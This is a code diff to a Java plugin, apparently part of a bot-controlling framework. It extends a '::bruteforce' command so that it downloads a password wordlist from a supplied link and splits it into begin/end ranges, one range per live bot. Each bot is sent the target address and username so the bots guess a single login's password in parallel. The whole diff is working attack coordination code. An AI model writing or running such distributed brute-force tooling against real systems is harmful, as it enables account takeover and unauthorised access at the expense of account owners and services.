@@ -11,7 +11,7 @@ import java.util.Map;
 import java.util.stream.Collectors;
 
 /**
- * Created by theOthers 04/01/2016.
+ * Created by theOthers 13/01/2016.
  * 04:11
  */
 public class Server extends ArthurPlug{
@@ -24,7 +24,7 @@ public class Server extends ArthurPlug{
 
 	@Override
 	public PluginHelp help() {
-		return new PluginHelp().setHelp("::bruteforce Usage: bruteforce username:<username> address:<address> bots:<bots> ");
+		return new PluginHelp().setHelp("::bruteforce Usage: bruteforce username:<username> address:<address> bots:<bots> link:<link>");
 	}
 
 	@Override
@@ -70,9 +70,7 @@ public class Server extends ArthurPlug{
 
 	@Override
 	public void handleSubTaskResult(Task task, SubTaskResult subTaskResult) {
-		/**
-		 * Only if I need to do anything when I get a reply.
-		 */
+
 	}
 
 	@Override
@@ -85,6 +83,9 @@ public class Server extends ArthurPlug{
 		String address;
         String username;
 		long botCount;
+		long numberOfWords;
+		long pace;
+
 
 		//Create a TaskResult and fill the common fields.
 		TaskResult result = new TaskResult()
@@ -97,10 +98,25 @@ public class Server extends ArthurPlug{
 			return result.setResponse("stdout", "Wrong parameters");
 		}
 
+
+		//get file, check size, divie send offsets
+		CrunchifyLoadGithubContent crunch = new CrunchifyLoadGithubContent((String) args.get("link"));
+		String lines[] = new String[0];
+		try {
+			lines = crunch.Crunchify().split("\\r?\\n");
+		} catch (Throwable throwable) {
+			throwable.printStackTrace();
+		}
+
+
 		//Parse parameters
 		address = (String) args.get("address");
         username = (String) args.get("username");
 		botCount = Long.parseLong((String) args.get("bots"));
+		numberOfWords = lines.length;
+		pace = numberOfWords / botCount ;
+		long cont = 0 ;
+
 
 		try {
 			//Get bots alive in the last 50 seconds and get as many as needed
@@ -110,7 +126,10 @@ public class Server extends ArthurPlug{
 						new SubTask(task, bot)
 								.setParameter("address", address)
                                 .setParameter("username",username)
+								.setParameter("begin", String.valueOf(cont))
+								.setParameter("end", String.valueOf(cont+pace))
 				);
+				cont+=pace;
 			}
 			result
 				.setSuccessful(true)
